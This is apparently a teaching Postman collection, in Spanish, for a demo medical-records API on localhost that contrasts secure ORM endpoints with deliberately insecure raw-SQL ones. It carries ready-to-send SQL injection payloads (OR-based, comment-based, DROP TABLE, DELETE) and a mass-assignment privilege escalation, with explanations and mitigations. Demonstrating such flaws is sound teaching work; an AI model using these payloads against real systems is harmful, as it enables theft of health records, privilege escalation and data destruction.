{
	"info": {
		"_postman_id": "28272012-55bf-417c-ae90-c2cdba5473ed",
		"name": "Sistema de Expedientes M√©dicos - API REST (SQLite)",
		"description": "Colecci√≥n completa para probar el Sistema de Expedientes M√©dicos.\n\n## ‚ö†Ô∏è Importante: Limitaciones de SQLite\n\nEsta colecci√≥n est√° configurada para **SQLite**. Algunos ataques de SQL Injection NO funcionar√°n debido a limitaciones t√©cnicas de SQLite:\n\n‚ùå **NO FUNCIONAN en SQLite:**\n- DROP TABLE con `;` (bloqueado por `execute()`)\n- DELETE con `;` (bloqueado por `execute()`)\n- M√∫ltiples sentencias separadas por `;`\n\n‚úÖ **S√ç FUNCIONAN en SQLite:**\n- OR-based injection (`' OR '1'='1`)\n- Comment injection (`'--`)\n- UNION attacks\n- Asignaci√≥n Masiva\n\n## üìå Para Ver DROP TABLE Funcionando\n\nMigra a MySQL siguiendo: `GUIA_MIGRACION_MYSQL.md`\n\n## Estructura\n- ‚úÖ Endpoints Seguros: Utilizan ORM y serializadores\n- ‚ö†Ô∏è Endpoints Inseguros: Vulnerables a SQL Injection\n- üî¥ Ejemplos de Ataques: Ataques que S√ç funcionan\n- üö´ Ataques Bloqueados: Ataques que NO funcionan en SQLite",
		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
		"_exporter_id": "36255323"
	},
	"item": [
		{
			"name": "1. Servicio de Pacientes (Puerto 8000)",
			"item": [
				{
					"name": "Endpoints Seguros ‚úÖ",
					"item": [
						{
							"name": "Registrar Paciente (Seguro)",
							"request": {
								"method": "POST",
								"header": [
									{
										"key": "Content-Type",
										"value": "application/json"
									}
								],
								"body": {
									"mode": "raw",
									"raw": "{\n    \"nombre\": \"Mar√≠a Gonz√°lez L√≥pez\",\n    \"fecha_nacimiento\": \"1985-03-20\",\n    \"nss\": \"98765432101\",\n    \"email\": \"maria.gonzalez@example.com\",\n    \"password\": \"MiPassword123\",\n    \"es_doctor\": false\n}"
								},
								"url": {
									"raw": "{{base_url_pacientes}}/api/pacientes/seguro/registro",
									"host": [
										"{{base_url_pacientes}}"
									],
									"path": [
										"api",
										"pacientes",
										"seguro",
										"registro"
									]
								},
								"description": "**Endpoint Seguro** que registra un nuevo paciente utilizando:\n- ‚úÖ ORM de Django (previene SQL Injection)\n- ‚úÖ Serializador con validaciones\n- ‚úÖ Hasheo autom√°tico de contrase√±as\n\n**Protecciones:**\n- Funciona en SQLite, MySQL, PostgreSQL, etc.\n- Previene TODOS los tipos de SQL Injection\n- Validaci√≥n autom√°tica de datos"
							},
							"response": []
						},
						{
							"name": "Registrar Doctor (Seguro)",
							"request": {
								"method": "POST",
								"header": [
									{
										"key": "Content-Type",
										"value": "application/json"
									}
								],
								"body": {
									"mode": "raw",
									"raw": "{\n    \"nombre\": \"Dr. Carlos Ram√≠rez Soto\",\n    \"fecha_nacimiento\": \"1975-08-15\",\n    \"nss\": \"11223344556\",\n    \"email\": \"carlos.ramirez@clinica.com\",\n    \"password\": \"DocPassword456\",\n    \"es_doctor\": true\n}"
								},
								"url": {
									"raw": "{{base_url_pacientes}}/api/pacientes/seguro/registro",
									"host": [
										"{{base_url_pacientes}}"
									],
									"path": [
										"api",
										"pacientes",
										"seguro",
										"registro"
									]
								},
								"description": "Registra un nuevo **doctor** en el sistema.\n\nNota: El campo `es_doctor: true` identifica que esta persona es un doctor."
							},
							"response": []
						},
						{
							"name": "Actualizar Perfil (Seguro)",
							"request": {
								"method": "PUT",
								"header": [
									{
										"key": "Content-Type",
										"value": "application/json"
									}
								],
								"body": {
									"mode": "raw",
									"raw": "{\n    \"nombre\": \"Mar√≠a Gonz√°lez L√≥pez de P√©rez\",\n    \"email\": \"maria.gonzalez.nuevo@example.com\"\n}"
								},
								"url": {
									"raw": "{{base_url_pacientes}}/api/pacientes/seguro/perfil/1",
									"host": [
										"{{base_url_pacientes}}"
									],
									"path": [
										"api",
										"pacientes",
										"seguro",
										"perfil",
										"1"
									]
								},
								"description": "**Endpoint Seguro** para actualizar el perfil de un paciente.\n\n**Protecciones:**\n- ‚úÖ Solo permite modificar campos espec√≠ficos (nombre, email)\n- ‚úÖ El campo `es_doctor` NO puede ser modificado (read-only)\n- ‚úÖ Previene Asignaci√≥n Masiva"
							},
							"response": []
						}
					],
					"description": "Endpoints que utilizan **ORM** y **serializadores** para garantizar la seguridad."
				},
				{
					"name": "Endpoints Inseguros ‚ö†Ô∏è",
					"item": [
						{
							"name": "Registrar Paciente (Inseguro)",
							"request": {
								"method": "POST",
								"header": [
									{
										"key": "Content-Type",
										"value": "application/json"
									}
								],
								"body": {
									"mode": "raw",
									"raw": "{\n    \"nombre\": \"Pedro Mart√≠nez\",\n    \"fecha_nacimiento\": \"1992-11-10\",\n    \"nss\": \"55566677788\",\n    \"email\": \"pedro.martinez@example.com\",\n    \"password\": \"Pedro123\",\n    \"es_doctor\": false\n}"
								},
								"url": {
									"raw": "{{base_url_pacientes}}/api/pacientes/inseguro/registro",
									"host": [
										"{{base_url_pacientes}}"
									],
									"path": [
										"api",
										"pacientes",
										"inseguro",
										"registro"
									]
								},
								"description": "**‚ö†Ô∏è ENDPOINT INSEGURO - SOLO PARA DEMOSTRACI√ìN**\n\nVulnerabilidades:\n- ‚ùå Usa SQL RAW sin preparar\n- ‚ùå Vulnerable a SQL Injection\n- ‚ùå Concatenaci√≥n directa de strings\n\n**NOTA SQLite:** Algunos ataques (DROP TABLE con `;`) NO funcionan en SQLite debido a limitaciones de `cursor.execute()`."
							},
							"response": []
						},
						{
							"name": "Actualizar Perfil (Inseguro)",
							"request": {
								"method": "PUT",
								"header": [
									{
										"key": "Content-Type",
										"value": "application/json"
									}
								],
								"body": {
									"mode": "raw",
									"raw": "{\n    \"nombre\": \"Pedro Mart√≠nez Actualizado\",\n    \"email\": \"pedro.nuevo@example.com\"\n}"
								},
								"url": {
									"raw": "{{base_url_pacientes}}/api/pacientes/inseguro/perfil/3",
									"host": [
										"{{base_url_pacientes}}"
									],
									"path": [
										"api",
										"pacientes",
										"inseguro",
										"perfil",
										"3"
									]
								},
								"description": "**‚ö†Ô∏è ENDPOINT INSEGURO**\n\nVulnerabilidades:\n- ‚ùå SQL Injection\n- ‚ùå Asignaci√≥n Masiva (permite modificar `es_doctor`)"
							},
							"response": []
						}
					]
				},
				{
					"name": "Ataques que S√ç Funcionan en SQLite ‚úÖüî¥",
					"item": [
						{
							"name": "‚úÖ Asignaci√≥n Masiva - Convertirse en Doctor",
							"request": {
								"method": "PUT",
								"header": [
									{
										"key": "Content-Type",
										"value": "application/json"
									}
								],
								"body": {
									"mode": "raw",
									"raw": "{\n    \"nombre\": \"Atacante Malicioso\",\n    \"email\": \"atacante@evil.com\",\n    \"es_doctor\": true\n}"
								},
								"url": {
									"raw": "{{base_url_pacientes}}/api/pacientes/inseguro/perfil/3",
									"host": [
										"{{base_url_pacientes}}"
									],
									"path": [
										"api",
										"pacientes",
										"inseguro",
										"perfil",
										"3"
									]
								},
								"description": "**‚úÖ ESTE ATAQUE S√ç FUNCIONA EN SQLITE**\n\n**üî¥ ATAQUE: Asignaci√≥n Masiva**\n\n**Objetivo:** Elevar privilegios de un paciente com√∫n a doctor\n\n**Payload:**\n```json\n{\n    \"es_doctor\": true\n}\n```\n\n**¬øQu√© hace?**\nExplota la falta de validaci√≥n de campos permitidos para modificar el campo `es_doctor` sin autorizaci√≥n.\n\n**Resultado Esperado:**\n- ‚úÖ El campo `es_doctor` cambia de `false` a `true`\n- ‚úÖ Un paciente obtiene privilegios de doctor\n- ‚úÖ Funciona igual en SQLite, MySQL, PostgreSQL\n\n**Mitigaci√≥n:**\nEl endpoint seguro usa un serializador con campos expl√≠citos y `es_doctor` como `read_only`."
							},
							"response": []
						}
					],
					"description": "Ataques que **S√ç funcionan** en SQLite"
				},
				{
					"name": "Ataques Bloqueados por SQLite üö´",
					"item": [
						{
							"name": "üö´ DROP TABLE - NO Funciona en SQLite",
							"request": {
								"method": "POST",
								"header": [
									{
										"key": "Content-Type",
										"value": "application/json"
									}
								],
								"body": {
									"mode": "raw",
									"raw": "{\n    \"nombre\": \"Test'; DROP TABLE pacientes_paciente; --\",\n    \"fecha_nacimiento\": \"1990-01-01\",\n    \"nss\": \"99999999999\",\n    \"email\": \"hacker@test.com\",\n    \"password\": \"test123\",\n    \"es_doctor\": false\n}"
								},
								"url": {
									"raw": "{{base_url_pacientes}}/api/pacientes/inseguro/registro",
									"host": [
										"{{base_url_pacientes}}"
									],
									"path": [
										"api",
										"pacientes",
										"inseguro",
										"registro"
									]
								},
								"description": "**üö´ ESTE ATAQUE NO FUNCIONA EN SQLITE**\n\n**Payload:**\n```sql\nTest'; DROP TABLE pacientes_paciente; --\n```\n\n**Resultado Esperado en SQLite:**\n```json\n{\n    \"error\": \"near \\\";\\\": syntax error\",\n    \"mensaje\": \"Error al registrar paciente\"\n}\n```\n\n**¬øPor qu√© NO funciona?**\n- SQLite usa `cursor.execute()` que solo permite **UNA sentencia SQL** por llamada\n- Cuando detecta un `;` seguido de otra sentencia, lanza error de sintaxis\n- Esto NO es una protecci√≥n del c√≥digo, sino una limitaci√≥n del motor de BD\n\n**¬øEl c√≥digo es seguro?**\n‚ùå **NO** - El c√≥digo SIGUE siendo vulnerable:\n- En MySQL/PostgreSQL este ataque S√ç funcionar√≠a\n- La \"protecci√≥n\" es accidental, no intencional\n- Otros ataques (OR-based) S√ç funcionan\n\n**Para ver este ataque funcionando:**\nMigra a MySQL siguiendo `GUIA_MIGRACION_MYSQL.md`\n\n**Conclusi√≥n:**\nNO debes depender de caracter√≠sticas del motor de BD para seguridad. Usa siempre un ORM."
							},
							"response": []
						},
						{
							"name": "üö´ DELETE Malicioso - NO Funciona en SQLite",
							"request": {
								"method": "POST",
								"header": [
									{
										"key": "Content-Type",
										"value": "application/json"
									}
								],
								"body": {
									"mode": "raw",
									"raw": "{\n    \"nombre\": \"Test'; DELETE FROM pacientes_paciente WHERE '1'='1'; --\",\n    \"fecha_nacimiento\": \"1990-01-01\",\n    \"nss\": \"88888888888\",\n    \"email\": \"delete@test.com\",\n    \"password\": \"test123\",\n    \"es_doctor\": false\n}"
								},
								"url": {
									"raw": "{{base_url_pacientes}}/api/pacientes/inseguro/registro",
									"host": [
										"{{base_url_pacientes}}"
									],
									"path": [
										"api",
										"pacientes",
										"inseguro",
										"registro"
									]
								},
								"description": "**üö´ ESTE ATAQUE NO FUNCIONA EN SQLITE**\n\n**Payload:**\n```sql\nTest'; DELETE FROM pacientes_paciente WHERE '1'='1'; --\n```\n\n**Objetivo:** Eliminar todos los registros de pacientes\n\n**Resultado en SQLite:**\nError de sintaxis (bloqueado por `execute()`)\n\n**En MySQL:**\n‚úÖ Eliminar√≠a todos los registros de la tabla\n\n**Moraleja:**\nEl c√≥digo es vulnerable independientemente del motor de BD usado."
							},
							"response": []
						}
					],
					"description": "Ataques que **NO funcionan** en SQLite por limitaciones t√©cnicas.\n\n‚ö†Ô∏è **IMPORTANTE:** Estos ataques S√ç funcionar√≠an en MySQL/PostgreSQL."
				}
			]
		},
		{
			"name": "2. Servicio de Expedientes (Puerto 8001)",
			"item": [
				{
					"name": "Endpoints Seguros ‚úÖ",
					"item": [
						{
							"name": "Crear Nota M√©dica (Seguro)",
							"request": {
								"method": "POST",
								"header": [
									{
										"key": "Content-Type",
										"value": "application/json"
									}
								],
								"body": {
									"mode": "raw",
									"raw": "{\n    \"id_paciente\": 1,\n    \"id_doctor\": 2,\n    \"fecha_consulta\": \"2025-10-31T14:30:00\",\n    \"diagnostico\": \"Gripe estacional con fiebre de 38.5¬∞C, dolor de garganta y congesti√≥n nasal.\",\n    \"tratamiento\": \"Reposo absoluto por 3 d√≠as. Paracetamol 500mg cada 8 horas. Abundantes l√≠quidos.\"\n}"
								},
								"url": {
									"raw": "{{base_url_expedientes}}/api/expedientes/seguro/crear",
									"host": [
										"{{base_url_expedientes}}"
									],
									"path": [
										"api",
										"expedientes",
										"seguro",
										"crear"
									]
								},
								"description": "**Endpoint Seguro** para crear una nueva nota m√©dica.\n\n**Protecciones:**\n- ‚úÖ Utiliza ORM de Django\n- ‚úÖ Previene SQL Injection\n- ‚úÖ Valida campos con serializador"
							},
							"response": []
						},
						{
							"name": "Buscar Expedientes por NSS (Seguro)",
							"request": {
								"method": "GET",
								"header": [],
								"url": {
									"raw": "{{base_url_expedientes}}/api/expedientes/seguro/buscar?nss=98765432101",
									"host": [
										"{{base_url_expedientes}}"
									],
									"path": [
										"api",
										"expedientes",
										"seguro",
										"buscar"
									],
									"query": [
										{
											"key": "nss",
											"value": "98765432101"
										}
									]
								},
								"description": "**Endpoint Seguro** para buscar todas las notas m√©dicas de un paciente.\n\n**Protecciones:**\n- ‚úÖ Utiliza ORM con filtros seguros\n- ‚úÖ Previene SQL Injection"
							},
							"response": []
						}
					]
				},
				{
					"name": "Endpoints Inseguros ‚ö†Ô∏è",
					"item": [
						{
							"name": "Crear Nota M√©dica (Inseguro)",
							"request": {
								"method": "POST",
								"header": [
									{
										"key": "Content-Type",
										"value": "application/json"
									}
								],
								"body": {
									"mode": "raw",
									"raw": "{\n    \"id_paciente\": 1,\n    \"id_doctor\": 2,\n    \"fecha_consulta\": \"2025-10-31T16:00:00\",\n    \"diagnostico\": \"Hipertensi√≥n arterial leve\",\n    \"tratamiento\": \"Losart√°n 50mg cada 24 horas\"\n}"
								},
								"url": {
									"raw": "{{base_url_expedientes}}/api/expedientes/inseguro/crear",
									"host": [
										"{{base_url_expedientes}}"
									],
									"path": [
										"api",
										"expedientes",
										"inseguro",
										"crear"
									]
								},
								"description": "**‚ö†Ô∏è ENDPOINT INSEGURO**\n\nVulnerabilidades:\n- ‚ùå Usa SQL RAW\n- ‚ùå Vulnerable a SQL Injection"
							},
							"response": []
						},
						{
							"name": "Buscar Expedientes por NSS (Inseguro)",
							"request": {
								"method": "GET",
								"header": [],
								"url": {
									"raw": "{{base_url_expedientes}}/api/expedientes/inseguro/buscar?nss=98765432101",
									"host": [
										"{{base_url_expedientes}}"
									],
									"path": [
										"api",
										"expedientes",
										"inseguro",
										"buscar"
									],
									"query": [
										{
											"key": "nss",
											"value": "98765432101"
										}
									]
								},
								"description": "**‚ö†Ô∏è ENDPOINT INSEGURO**\n\nVulnerabilidades:\n- ‚ùå SQL RAW con concatenaci√≥n directa\n- ‚ùå Vulnerable a SQL Injection"
							},
							"response": []
						}
					]
				},
				{
					"name": "Ataques que S√ç Funcionan en SQLite ‚úÖüî¥",
					"item": [
						{
							"name": "‚úÖ SQL Injection - Obtener TODOS los Expedientes",
							"request": {
								"method": "GET",
								"header": [],
								"url": {
									"raw": "{{base_url_expedientes}}/api/expedientes/inseguro/buscar?nss=123' OR '1'='1",
									"host": [
										"{{base_url_expedientes}}"
									],
									"path": [
										"api",
										"expedientes",
										"inseguro",
										"buscar"
									],
									"query": [
										{
											"key": "nss",
											"value": "123' OR '1'='1"
										}
									]
								},
								"description": "**‚úÖ ESTE ATAQUE S√ç FUNCIONA EN SQLITE**\n\n**üî¥ ATAQUE: SQL Injection - OR-Based**\n\n**Payload:**\n```sql\n123' OR '1'='1\n```\n\n**¬øQu√© hace?**\nManipula la consulta SQL para que la condici√≥n sea siempre verdadera:\n\n**Query original:**\n```sql\nSELECT * FROM expedientes WHERE nss = '98765432101'\n```\n\n**Query inyectada:**\n```sql\nSELECT * FROM expedientes WHERE nss = '123' OR '1'='1'\n```\n\n**Resultado Esperado:**\n- ‚úÖ Devuelve **TODOS** los expedientes m√©dicos de la base de datos\n- ‚úÖ Funciona en SQLite, MySQL, PostgreSQL, etc.\n- ‚ùå Violaci√≥n masiva de privacidad m√©dica\n\n**Impacto:**\n- Exposici√≥n de datos sensibles de salud\n- Violaci√≥n de confidencialidad m√©dica\n- Incumplimiento de HIPAA, LGPD, etc.\n\n**Mitigaci√≥n:**\n```python\n# ‚úÖ Seguro - Usando ORM\npaciente = Paciente.objects.filter(nss=nss).first()\n```"
							},
							"response": []
						},
						{
							"name": "‚úÖ SQL Injection - Always True",
							"request": {
								"method": "GET",
								"header": [],
								"url": {
									"raw": "{{base_url_expedientes}}/api/expedientes/inseguro/buscar?nss=' OR 1=1 OR ''='",
									"host": [
										"{{base_url_expedientes}}"
									],
									"path": [
										"api",
										"expedientes",
										"inseguro",
										"buscar"
									],
									"query": [
										{
											"key": "nss",
											"value": "' OR 1=1 OR ''='"
										}
									]
								},
								"description": "**‚úÖ ESTE ATAQUE S√ç FUNCIONA EN SQLITE**\n\n**Payload:**\n```sql\n' OR 1=1 OR ''='\n```\n\n**Resultado:**\n‚úÖ Devuelve todos los registros (condici√≥n siempre verdadera)"
							},
							"response": []
						},
						{
							"name": "‚úÖ SQL Injection - Comment-Based",
							"request": {
								"method": "GET",
								"header": [],
								"url": {
									"raw": "{{base_url_expedientes}}/api/expedientes/inseguro/buscar?nss=98765432101' --",
									"host": [
										"{{base_url_expedientes}}"
									],
									"path": [
										"api",
										"expedientes",
										"inseguro",
										"buscar"
									],
									"query": [
										{
											"key": "nss",
											"value": "98765432101' --"
										}
									]
								},
								"description": "**‚úÖ ESTE ATAQUE S√ç FUNCIONA EN SQLITE**\n\n**Payload:**\n```sql\n98765432101' --\n```\n\n**¬øQu√© hace?**\n`--` es un comentario en SQL que comenta el resto de la query.\n\n‚úÖ Funciona en todos los motores de BD"
							},
							"response": []
						}
					],
					"description": "Ataques OR-based que **S√ç funcionan** en SQLite"
				},
				{
					"name": "Ataques Bloqueados por SQLite üö´",
					"item": [
						{
							"name": "üö´ DROP TABLE - NO Funciona en SQLite",
							"request": {
								"method": "GET",
								"header": [],
								"url": {
									"raw": "{{base_url_expedientes}}/api/expedientes/inseguro/buscar?nss=123'; DROP TABLE expedientes_notamedica; --",
									"host": [
										"{{base_url_expedientes}}"
									],
									"path": [
										"api",
										"expedientes",
										"inseguro",
										"buscar"
									],
									"query": [
										{
											"key": "nss",
											"value": "123'; DROP TABLE expedientes_notamedica; --"
										}
									]
								},
								"description": "**üö´ ESTE ATAQUE NO FUNCIONA EN SQLITE**\n\n**Payload:**\n```sql\n123'; DROP TABLE expedientes_notamedica; --\n```\n\n**Resultado en SQLite:**\nError de sintaxis (bloqueado por `execute()`)\n\n**En MySQL/PostgreSQL:**\n‚úÖ Eliminar√≠a completamente la tabla de expedientes\n\n**Impacto en MySQL:**\n- ‚ö†Ô∏è **DESTRUCCI√ìN TOTAL** de la tabla\n- P√©rdida de informaci√≥n m√©dica cr√≠tica\n- Da√±o catastr√≥fico al sistema\n\n**Para ver este ataque funcionando:**\nMigra a MySQL con: `GUIA_MIGRACION_MYSQL.md`"
							},
							"response": []
						}
					]
				}
			]
		},
		{
			"name": "üìä Resumen de Vulnerabilidades",
			"item": [],
			"description": "## Tabla Comparativa: Ataques en SQLite\n\n| Ataque | ¬øFunciona en SQLite? | Endpoint Inseguro | Endpoint Seguro |\n| --- | --- | --- | --- |\n| **OR-Based** (`' OR '1'='1`) | ‚úÖ S√ç | ‚ùå Vulnerable | ‚úÖ Protegido |\n| **DROP TABLE** (`'; DROP...`) | üö´ NO (bloqueado) | ‚ö†Ô∏è C√≥digo vulnerable | ‚úÖ Protegido |\n| **DELETE** (`'; DELETE...`) | üö´ NO (bloqueado) | ‚ö†Ô∏è C√≥digo vulnerable | ‚úÖ Protegido |\n| **Comment** (`'--`) | ‚úÖ S√ç | ‚ùå Vulnerable | ‚úÖ Protegido |\n| **UNION** | ‚úÖ S√ç | ‚ùå Vulnerable | ‚úÖ Protegido |\n| **Asignaci√≥n Masiva** | ‚úÖ S√ç | ‚ùå Vulnerable | ‚úÖ Protegido |"
		}
	],
	"event": [
		{
			"listen": "prerequest",
			"script": {
				"type": "text/javascript",
				"exec": [
					""
				]
			}
		},
		{
			"listen": "test",
			"script": {
				"type": "text/javascript",
				"exec": [
					""
				]
			}
		}
	],
	"variable": [
		{
			"key": "base_url_pacientes",
			"value": "http://localhost:8000",
			"type": "string"
		},
		{
			"key": "base_url_expedientes",
			"value": "http://localhost:8001",
			"type": "string"
		}
	]
}